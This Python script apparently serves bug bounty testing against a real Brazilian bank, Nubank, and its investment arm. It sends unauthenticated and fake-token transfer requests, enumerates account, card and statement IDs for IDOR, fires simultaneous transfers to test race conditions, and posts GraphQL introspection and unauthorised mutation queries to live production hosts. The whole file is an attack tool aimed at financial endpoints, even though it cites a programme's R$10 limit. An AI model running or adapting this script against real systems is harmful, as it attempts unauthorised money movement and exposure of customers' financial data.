#!/usr/bin/env python3
"""
Script para testes de BAC/IDOR no Nubank
Foco em transações financeiras e controle de acesso
"""

import requests
import time
import json
import threading
from itertools import product

class NubankBACTester:
    def __init__(self):
        self.base_url = "https://prod-s0-webapp-proxy.nubank.com.br"
        self.session = requests.Session()
        self.setup_session()
        
    def setup_session(self):
        """Configura sessão com headers obrigatórios"""
        print("🔧 Configurando sessão para Nubank...")
        
        # Header obrigatório conforme guia
        self.session.headers.update({
            'X-Correlation-Id': 'bc-handle',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        })
        
    def test_bac_transfers(self):
        """Testa BAC em transferências financeiras"""
        print("🎯 Testando BAC em transferências...")
        
        # Endpoints críticos para transferências
        transfer_endpoints = [
            "/api/transfers",
            "/api/pix/transfers", 
            "/api/ted/transfers",
            "/api/doc/transfers",
            "/api/mobile/transfers",
            "/api/graphql"  # Nubank usa GraphQL
        ]
        
        # Payloads de teste (máximo R$ 10 conforme guia)
        test_payloads = [
            {
                "amount": 10.00,
                "destination_account": "12345678",
                "destination_bank": "001",
                "description": "Teste BAC"
            },
            {
                "amount": 5.00,
                "destination_cpf": "11111111111",
                "pix_key": "test@test.com"
            },
            {
                "value": 1.00,
                "to_account": "98765432",
                "transfer_type": "ted"
            }
        ]
        
        for endpoint in transfer_endpoints:
            print(f"  Testando endpoint: {endpoint}")
            
            for payload in test_payloads:
                try:
                    # Teste 1: Sem autenticação
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=payload,
                        timeout=10
                    )
                    
                    if response.status_code in [200, 201, 202]:
                        print(f"  🚨 POSSÍVEL BAC! Transferência sem auth: {endpoint}")
                        print(f"    Status: {response.status_code}")
                        print(f"    Response: {response.text[:200]}...")
                        
                    # Teste 2: Com token inválido
                    headers_invalid = {'Authorization': 'Bearer invalid_token_123'}
                    response2 = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=payload,
                        headers=headers_invalid,
                        timeout=10
                    )
                    
                    if response2.status_code in [200, 201, 202]:
                        print(f"  🚨 POSSÍVEL BAC! Token inválido aceito: {endpoint}")
                        
                except Exception as e:
                    print(f"    ❌ Erro: {e}")
                    
                time.sleep(0.5)  # Rate limiting
    
    def test_idor_accounts(self):
        """Testa IDOR em contas e dados financeiros"""
        print("🎯 Testando IDOR em contas...")
        
        # Endpoints com IDs para testar
        idor_endpoints = [
            "/api/accounts/{id}",
            "/api/transactions/{id}",
            "/api/statements/{id}",
            "/api/cards/{id}",
            "/api/investments/{id}",
            "/api/users/{id}",
            "/api/profiles/{id}",
            "/api/balances/{id}",
            "/api/limits/{id}",
            "/api/pix/keys/{id}"
        ]
        
        # IDs para testar (padrões comuns)
        test_ids = [
            "1", "2", "3", "123", "1234", "12345",
            "00000001", "00000002", "00000003",
            "user123", "acc456", "card789",
            "11111111111",  # CPF pattern
            "12345678901"   # CPF pattern
        ]
        
        for endpoint_template in idor_endpoints:
            print(f"  Testando IDOR: {endpoint_template}")
            
            for test_id in test_ids:
                endpoint = endpoint_template.format(id=test_id)
                
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data and len(str(data)) > 50:
                                print(f"  🚨 POSSÍVEL IDOR! Dados expostos: {endpoint}")
                                print(f"    Response: {str(data)[:200]}...")
                        except:
                            if len(response.text) > 50:
                                print(f"  🚨 POSSÍVEL IDOR! Dados expostos: {endpoint}")
                                print(f"    Response: {response.text[:200]}...")
                                
                except Exception as e:
                    print(f"    ❌ Erro: {e}")
                    
                time.sleep(0.3)
    
    def test_race_conditions(self):
        """Testa race conditions em transações"""
        print("🎯 Testando Race Conditions...")
        
        # Payload para teste de duplicação (R$ 1 conforme limite)
        race_payload = {
            "amount": 1.00,
            "destination": "test_account",
            "description": "Race condition test"
        }
        
        def send_transfer():
            """Função para enviar transferência"""
            try:
                response = self.session.post(
                    f"{self.base_url}/api/transfers",
                    json=race_payload,
                    timeout=5
                )
                return response.status_code, response.text
            except Exception as e:
                return None, str(e)
        
        print("  Enviando 5 transferências simultâneas...")
        threads = []
        results = []
        
        # Criar threads para requisições simultâneas
        for i in range(5):
            thread = threading.Thread(target=lambda: results.append(send_transfer()))
            threads.append(thread)
        
        # Iniciar todas as threads simultaneamente
        start_time = time.time()
        for thread in threads:
            thread.start()
        
        # Aguardar conclusão
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        
        # Analisar resultados
        successful_requests = [r for r in results if r[0] and r[0] in [200, 201, 202]]
        
        if len(successful_requests) > 1:
            print(f"  🚨 POSSÍVEL RACE CONDITION! {len(successful_requests)} transferências aceitas")
            print(f"    Tempo total: {end_time - start_time:.2f}s")
            
        for i, (status, response) in enumerate(results):
            if status:
                print(f"    Thread {i+1}: Status {status}")
    
    def test_graphql_injection(self):
        """Testa injeções em endpoints GraphQL"""
        print("🎯 Testando GraphQL Injection...")
        
        graphql_endpoint = "/api/graphql"
        
        # Queries maliciosas para testar
        malicious_queries = [
            {
                "query": "{ __schema { types { name } } }",  # Introspection
                "variables": {}
            },
            {
                "query": "{ accounts { id balance transactions } }",  # Data exposure
                "variables": {}
            },
            {
                "query": "mutation { transfer(amount: 10, to: \"test\") { success } }",  # Unauthorized mutation
                "variables": {}
            }
        ]
        
        for query_data in malicious_queries:
            try:
                response = self.session.post(
                    f"{self.base_url}{graphql_endpoint}",
                    json=query_data,
                    timeout=10
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'data' in data and data['data']:
                            print(f"  🚨 POSSÍVEL GRAPHQL EXPOSURE!")
                            print(f"    Query: {query_data['query'][:50]}...")
                            print(f"    Response: {str(data)[:200]}...")
                    except:
                        pass
                        
            except Exception as e:
                print(f"    ❌ Erro GraphQL: {e}")
    
    def test_investment_logic(self):
        """Testa lógica de investimentos (nuinvest.com.br)"""
        print("🎯 Testando lógica de investimentos...")
        
        investment_base = "https://api.nuinvest.com.br"
        
        # Endpoints de investimento
        investment_endpoints = [
            "/api/portfolios",
            "/api/positions", 
            "/api/orders",
            "/api/withdrawals",
            "/api/deposits",
            "/api/yields"
        ]
        
        # Payloads para testar lógica de negócios
        test_scenarios = [
            {
                "endpoint": "/api/orders",
                "payload": {"amount": 1.00, "asset": "TEST", "type": "buy"},
                "description": "Ordem de compra sem fundos"
            },
            {
                "endpoint": "/api/withdrawals", 
                "payload": {"amount": 999999.99},
                "description": "Saque maior que saldo"
            },
            {
                "endpoint": "/api/yields",
                "payload": {"portfolio_id": "1"},
                "description": "Rendimentos de portfolio alheio"
            }
        ]
        
        for scenario in test_scenarios:
            try:
                response = self.session.post(
                    f"{investment_base}{scenario['endpoint']}",
                    json=scenario['payload'],
                    timeout=10
                )
                
                if response.status_code in [200, 201, 202]:
                    print(f"  🚨 POSSÍVEL FALHA LÓGICA! {scenario['description']}")
                    print(f"    Endpoint: {scenario['endpoint']}")
                    print(f"    Status: {response.status_code}")
                    
            except Exception as e:
                print(f"    ❌ Erro investimento: {e}")
    
    def run_comprehensive_test(self):
        """Executa todos os testes"""
        print("🚀 Iniciando testes comprehensivos no Nubank...")
        print("⚠️  Respeitando limite de R$ 10 por PoC")
        print("⚠️  Usando header X-Correlation-Id: bc-handle")
        print("")
        
        try:
            # Executar todos os testes
            self.test_bac_transfers()
            print("")
            
            self.test_idor_accounts()
            print("")
            
            self.test_race_conditions()
            print("")
            
            self.test_graphql_injection()
            print("")
            
            self.test_investment_logic()
            print("")
            
            print("🎯 Testes concluídos!")
            print("📋 Próximos passos:")
            print("  1. Analisar vulnerabilidades encontradas")
            print("  2. Criar PoCs detalhados")
            print("  3. Documentar passos de reprodução")
            print("  4. Submeter relatórios com impacto real")
            
        except Exception as e:
            print(f"❌ Erro geral: {e}")

if __name__ == "__main__":
    tester = NubankBACTester()
    tester.run_comprehensive_test()
